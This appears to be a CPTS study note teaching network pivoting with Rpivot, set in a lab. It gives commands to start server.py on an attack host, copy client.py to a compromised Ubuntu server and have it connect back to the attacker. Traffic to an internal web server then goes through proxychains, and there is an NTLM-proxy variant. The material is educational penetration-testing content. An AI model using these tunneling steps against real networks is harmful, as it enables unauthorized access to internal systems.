# 🌐 1. Web Server Pivoting with Rpivot

> [!info] What is Rpivot?  
> **Rpivot** is a reverse SOCKS proxy written in Python 2 that can be used for **pivoting into an internal network**.
> 
> The key idea is:
> 
> **The compromised internal machine initiates the connection outward to our attack machine**, and Rpivot then gives us a SOCKS proxy on the attack machine that can reach networks accessible from the compromised host.

---

# 🧠 2. The Network Situation

The scenario looks like this:

```text
                    ATTACK HOST
                    10.10.15.5
                         │
                         │ Internet / External Network
                         │
                         ▼
                ┌─────────────────┐
                │   Pivot Server  │
                │     Ubuntu      │
                │                 │
                │ 10.129.15.50    │  ← External-facing IP
                │ 172.16.5.129    │  ← Internal-facing IP
                └────────┬────────┘
                         │
                         │ Internal Network
                         │ 172.16.5.0/23
                         ▼
                ┌─────────────────┐
                │   Web Server    │
                │ 172.16.5.135    │
                │                 │
                │     TCP/80      │
                └─────────────────┘
```

The important problem is:

```text
Attack Host
10.10.15.5
     │
     │ ❌ Cannot directly reach
     ▼
172.16.5.135
```

But:

```text
Attack Host
10.10.15.5
     │
     ▼
Pivot
10.129.15.50 / 172.16.5.129
     │
     ▼
172.16.5.135
     │
     └── TCP/80
```

The pivot can reach the internal web server.

Therefore, the pivot becomes our **bridge into the internal network**.

---

# 🔄 3. Why Rpivot Is Called a "Reverse" SOCKS Proxy

A normal SOCKS setup might look like:

```text
Attacker ───────► SOCKS Server ───────► Internal Target
```

But Rpivot reverses the connection establishment:

```text
Internal Pivot ───────► Attacker
       │
       │ reverse connection
       ▼
Attack Host SOCKS Proxy
       │
       ▼
Internal Target
```

The compromised machine runs `client.py` and **connects back to our attack machine**.

This is useful when:

> [!important]  
> **The internal machine can make outbound connections to us, but we cannot directly initiate connections from the attack machine into the internal network.**

So instead of trying to force:

```text
Attack Host ──X──► Pivot
```

we arrange:

```text
Pivot ─────► Attack Host
```

and then use that established connection to carry our SOCKS traffic.

---

# 🧩 4. Rpivot Architecture

Rpivot has two important components:

|Component|Runs on|Purpose|
|---|---|---|
|`server.py`|Attack Host|Creates the SOCKS proxy and waits for the pivot|
|`client.py`|Compromised Pivot|Connects back to the attack host and provides access to networks reachable from the pivot|

The traffic flow becomes:

```text
Firefox
   │
   │ SOCKS
   ▼
127.0.0.1:9050
   │
   │ Rpivot server.py
   ▼
Rpivot tunnel
   │
   │ connection established by pivot
   ▼
Pivot Ubuntu
172.16.5.129
   │
   ▼
172.16.5.135:80
```

This is the core mental model.

---

# 📥 5. Clone Rpivot

From the **attack host**:

```bash
git clone https://github.com/klsecservices/rpivot.git
```

This downloads the Rpivot source code.

After cloning:

```text
rpivot/
├── server.py
├── client.py
└── ...
```

> [!warning] Python 2  
> This version of Rpivot is a **Python 2** tool. Modern systems may not have Python 2 installed by default, so this can require an appropriate lab environment or compatible Python 2 installation.

---

# 🖥️ 6. Start `server.py` on the Attack Host

From the attack host:

```bash
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

There are two important ports here:

```text
              ATTACK HOST
          ┌───────────────────┐
          │                   │
          │ :9999             │
          │   ▲               │
          │   │ client        │
          │   │ connects      │
          │   │               │
          │   │               │
          │ :9050             │
          │   ▲               │
          │   │ SOCKS         │
          │   │ proxy         │
          └───┴───────────────┘
```

### `--server-port 9999`

```text
--server-port 9999
```

This is the port where the **Rpivot client connects**.

So:

```text
Pivot ─────► Attack Host:9999
```

### `--proxy-port 9050`

```text
--proxy-port 9050
```

This creates the local SOCKS proxy that our applications will use.

So:

```text
Firefox / ProxyChains
        │
        ▼
127.0.0.1:9050
        │
        ▼
Rpivot
```

### `--server-ip 0.0.0.0`

```text
--server-ip 0.0.0.0
```

This tells the server to listen on all available local interfaces rather than only one specific IP.

---

# 📦 7. Transfer Rpivot to the Pivot

The compromised Ubuntu machine needs `client.py`.

From the attack host:

```bash
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

The important point is that we're transferring the **Rpivot client code** to the compromised pivot.

We don't need to run the client on our attack host.

```text
ATTACK HOST
server.py
    │
    │ SCP
    ▼
PIVOT
client.py
```

---

# 🔌 8. Start `client.py` on the Pivot

On the compromised Ubuntu server:

```bash
ubuntu@WEB01:~/rpivot$ python2 client.py --server-ip 10.10.14.18 --server-port 9999
```

Output:

```text
Backconnecting to server 10.10.14.18 port 9999
```

This is the critical step.

The **pivot initiates the connection**:

```text
Pivot
10.129.15.50
     │
     │ TCP connection
     │
     ▼
Attack Host
10.10.14.18:9999
```

Notice the IP:

```text
--server-ip 10.10.14.18
```

This must be the IP address of the attack host that the pivot can reach.

---

# ✅ 9. Confirm the Connection

The Rpivot server reports:

```text
New connection from host 10.129.202.64, source port 35226
```

This confirms that the Rpivot client successfully connected back to the server.

At this point:

```text
Pivot ───────────────► Attack Host:9999
       Rpivot tunnel
```

The tunnel is now available for carrying SOCKS traffic.

> [!success] Important  
> This is the point where the pivot has effectively established the communication channel we needed.
> 
> We can now configure our applications to send traffic through the SOCKS proxy exposed by Rpivot.

---

# 🧦 10. Configure ProxyChains

The Rpivot server created the SOCKS proxy on:

```text
127.0.0.1:9050
```

Configure ProxyChains to use it.

Conceptually:

```text
ProxyChains
     │
     ▼
127.0.0.1:9050
     │
     ▼
Rpivot server
     │
     ▼
Rpivot tunnel
     │
     ▼
Pivot Ubuntu
     │
     ▼
Internal network
```

This is very similar to the SOCKS pivoting workflow used with Metasploit or SSH.

---



# 10.5 Open Browser With Proxychains

```shell
proxychains firefox-esr --no-remote about:blank
```
```

# 🌐 11. Access the Internal Web Server

The target web server is:

```text
172.16.5.135:80
```

From the attack host:

```bash
proxychains firefox-esr 172.16.5.135:80
```

The important part is:

```text
proxychains
```

Firefox itself does not need to understand the internal route.

ProxyChains intercepts the application's network connections and sends them through the SOCKS proxy.

The complete path becomes:

```text
┌──────────────┐
│   Firefox    │
└──────┬───────┘
       │
       │ HTTP request
       ▼
┌──────────────┐
│  ProxyChains │
└──────┬───────┘
       │
       │ SOCKS
       ▼
┌────────────────────┐
│ 127.0.0.1:9050     │
│ Rpivot SOCKS Proxy │
└────────┬───────────┘
         │
         │ Rpivot tunnel
         ▼
┌────────────────────┐
│ Compromised Ubuntu │
│ 172.16.5.129        │
└────────┬───────────┘
         │
         │ Internal connection
         ▼
┌────────────────────┐
│ 172.16.5.135:80    │
│ Internal Web Server │
└────────────────────┘
```

The browser therefore receives the internal web server's response as though it were reachable through the proxy.

---

# 🧠 12. What Actually Happened?

This is the most important part to understand.

You did **not** magically give your attack machine a new network interface.

You created a **SOCKS-based application-level tunnel**.

Think of it like this:

```text
             YOUR ATTACK MACHINE
             ┌───────────────┐
Firefox ────►│ SOCKS :9050   │
             └───────┬───────┘
                     │
                     │ Rpivot tunnel
                     ▼
             ┌───────────────┐
             │ COMPROMISED   │
             │ PIVOT         │
             └───────┬───────┘
                     │
                     │ Can reach
                     ▼
             ┌───────────────┐
             │ INTERNAL      │
             │ NETWORK       │
             └───────────────┘
```

The pivot is performing the important network reachability.

Your attack machine doesn't need a route like:

```text
172.16.5.0/23 via 10.129.15.50
```

Instead:

```text
Application
   ↓
SOCKS
   ↓
Rpivot
   ↓
Pivot
   ↓
Internal Target
```

---

# 🔥 13. Why This Works When Direct Pivoting Doesn't

Suppose the network has:

```text
ATTACK HOST
10.10.15.5
     │
     │ ❌ no route
     ▼
172.16.5.135
```

But:

```text
PIVOT
172.16.5.129
     │
     │ ✅ reachable
     ▼
172.16.5.135
```

If the pivot can initiate outbound communication:

```text
PIVOT ─────────────► ATTACK HOST
```

we can establish the Rpivot tunnel.

Then our traffic is effectively:

```text
ATTACK HOST
    │
    │ existing tunnel
    ▼
PIVOT
    │
    ▼
INTERNAL TARGET
```

So the fundamental requirement is not:

> "Can I route directly to the internal target?"

Instead ask:

> **"Can my compromised pivot reach the target, and can I establish a channel between the pivot and my attack host?"**

---

# 🔐 14. Rpivot Through an HTTP Proxy with NTLM Authentication

There may be situations where the pivot **cannot directly connect to the attack host**.

For example:

```text
Internal Pivot
      │
      │ outbound HTTP only
      ▼
Corporate HTTP Proxy
      │
      │ NTLM authentication
      ▼
Internet
      │
      ▼
Attack Host
```

Some organizations use HTTP proxies that require **NTLM authentication**.

In that situation, simply doing:

```text
Pivot ─────► Attack Host:9999
```

may fail.

The pivot must instead authenticate through the corporate HTTP proxy.

Rpivot's client can be configured with NTLM proxy parameters.

---

# 🪪 15. Rpivot NTLM Proxy Syntax

Example:

```bash
python client.py \
    --server-ip <IPaddressofTargetWebServer> \
    --server-port 8080 \
    --ntlm-proxy-ip <IPaddressofProxy> \
    --ntlm-proxy-port 8081 \
    --domain <nameofWindowsDomain> \
    --username <username> \
    --password <password>
```

The important options are:

|Option|Purpose|
|---|---|
|`--server-ip`|Destination/server Rpivot should connect toward|
|`--server-port`|Rpivot server port|
|`--ntlm-proxy-ip`|IP address of the HTTP proxy|
|`--ntlm-proxy-port`|HTTP proxy port|
|`--domain`|Windows/NTLM domain|
|`--username`|Username for proxy authentication|
|`--password`|Password for proxy authentication|

The traffic path becomes:

```text
             INTERNAL NETWORK
                    │
                    ▼
             ┌──────────────┐
             │ Rpivot       │
             │ client.py    │
             └──────┬───────┘
                    │
                    │ HTTP Proxy
                    ▼
             ┌──────────────┐
             │ Corporate    │
             │ HTTP Proxy   │
             │ + NTLM Auth  │
             └──────┬───────┘
                    │
                    ▼
               External
                    │
                    ▼
             ┌──────────────┐
             │ Attack Host  │
             │ Rpivot       │
             │ server.py    │
             └──────┬───────┘
                    │
                    ▼
              SOCKS :9050
                    │
                    ▼
             Internal Targets
```

> [!important] Why this matters  
> The technique isn't only about reaching an internal web server. The larger lesson is that **pivoting must account for the egress restrictions of the compromised host**.
> 
> If direct outbound TCP is blocked but HTTP proxy traffic is allowed, the proxy itself can become the path used to establish the tunnel.

---

# 🧭 16. CPTS Methodology — How You Should Think About Rpivot

Don't memorize:

```text
python2 server.py ...
python2 client.py ...
proxychains firefox ...
```

Instead, derive the technique from the network.

### Step 1 — Identify the network boundary

```text
ATTACKER
10.10.x.x
    │
    ▼
PIVOT
10.129.x.x / 172.16.x.x
    │
    ▼
INTERNAL
172.16.5.x
```

You discover an internal target that your attack machine cannot directly reach.

### Step 2 — Ask who can reach the target

```text
Attack Host ──❌──► Internal Web Server
Pivot ────────────► Internal Web Server
```

Therefore:

```text
Pivot = network bridge
```

### Step 3 — Ask whether the pivot can connect outward

If:

```text
Pivot ─────► Attack Host
```

works, a reverse tunnel is possible.

### Step 4 — Decide what type of access you need

If you want:

```text
Firefox
Nmap TCP connect
curl
other SOCKS-compatible applications
```

to access multiple internal destinations, a **SOCKS pivot** is useful.

### Step 5 — Choose Rpivot

Rpivot provides:

```text
Pivot → Attack Host
```

reverse connectivity and exposes:

```text
Attack Host → SOCKS :9050
```

### Step 6 — Send application traffic through the SOCKS proxy

```text
proxychains <application>
```

Now the application can reach destinations through the pivot.

---

# 🔀 17. Rpivot vs Other Pivoting Techniques

|Technique|Main idea|Application configuration|Best mental model|
|---|---|---|---|
|**Rpivot**|Reverse SOCKS proxy|ProxyChains / SOCKS-aware app|Pivot connects back → SOCKS|
|**SSH `-D`**|Dynamic SOCKS proxy|ProxyChains / SOCKS-aware app|SSH → SOCKS|
|**Metasploit SOCKS**|SOCKS proxy through Meterpreter|ProxyChains|Meterpreter → SOCKS|
|**Sshuttle**|Routes traffic through SSH|Usually transparent to applications|Local routing/firewall → SSH → pivot|
|**Socat**|Socket-to-socket relay|Usually connect to forwarded port|Specific socket → relay → target|
|**Plink `-D`**|Windows SSH dynamic SOCKS|Proxifier / ProxyChains|Windows → SSH → SOCKS|

The key distinction:

```text
SOCKS-based:
Application
    ↓
SOCKS Proxy
    ↓
Pivot
    ↓
Target
```

versus:

```text
Sshuttle:
Application
    ↓
OS routing / iptables
    ↓
SSH
    ↓
Pivot
    ↓
Target
```

versus:

```text
Socat:
Connection
    ↓
Socat listener
    ↓
Specific destination
```

---

# 🧠 18. The Mental Model to Remember

> [!tip] Rpivot in one sentence  
> **Rpivot lets a compromised internal machine connect back to your attack host and carry SOCKS traffic through that connection, allowing your applications to reach networks accessible from the compromised machine.**

Think:

```text
            "I can't reach the internal server."
                         │
                         ▼
              "Can the pivot reach it?"
                         │
                        YES
                         │
                         ▼
             "Can the pivot reach me?"
                         │
                        YES
                         │
                         ▼
              Establish reverse tunnel
                         │
                         ▼
                  Expose SOCKS
                         │
                         ▼
               127.0.0.1:9050
                         │
                         ▼
                  ProxyChains
                         │
                         ▼
              Internal target(s)
```

---

# 🎯 19. CPTS Decision Point

When you encounter an internal network during an assessment:

```text
                 INTERNAL TARGET
                       │
                       ▼
          Can attack host reach it?
                 /           \
               YES            NO
                │              │
                ▼              ▼
          Connect directly   Find pivot
                               │
                               ▼
                    Can compromised host
                    reach the target?
                         /       \
                       NO         YES
                       │           │
                       ▼           ▼
                  Find another   Can pivot
                    route        connect back
                                 to attacker?
                                  /      \
                                NO        YES
                                │          │
                                ▼          ▼
                         Egress problem   Reverse
                         / proxy /       SOCKS
                         allowed path    (Rpivot)
```

The **tool comes after the topology analysis**.

That is the CPTS-level lesson:

> [!success] Don't think "Which pivot tool do I remember?"
> 
> Think:
> 
> **What can reach what? → What traffic direction is possible? → What egress restrictions exist? → What kind of access do I need? → Which pivot mechanism matches that situation?**

# 📌 20. Key Takeaways

- **Rpivot = reverse SOCKS proxy.**
    
- `server.py` runs on the **attack host**.
    
- `client.py` runs on the **compromised pivot**.
    
- `--server-port 9999` is the connection point used by the Rpivot client.
    
- `--proxy-port 9050` exposes the SOCKS proxy on the attack host.
    
- The **pivot initiates the connection outward**, which is why Rpivot is useful when inbound connectivity to the internal host is unavailable.
    
- ProxyChains can send applications such as Firefox through `127.0.0.1:9050`.
    
- The pivot performs the actual connection to the internal target.
    
- Rpivot can also work through an **HTTP proxy requiring NTLM authentication**, when configured with the appropriate proxy/domain/credential parameters.
    
- The most important concept is **not the commands**; it is recognizing that the pivot has access to a network that the attack host cannot directly reach.
    

**Mental model:**

```text
        ATTACK HOST
             │
             │ SOCKS :9050
             ▼
        Rpivot Server
             │
             │ Reverse tunnel
             ▼
       COMPROMISED PIVOT
             │
             │ Internal reachability
             ▼
       INTERNAL NETWORK
             │
             ▼
       TARGET SERVICES
```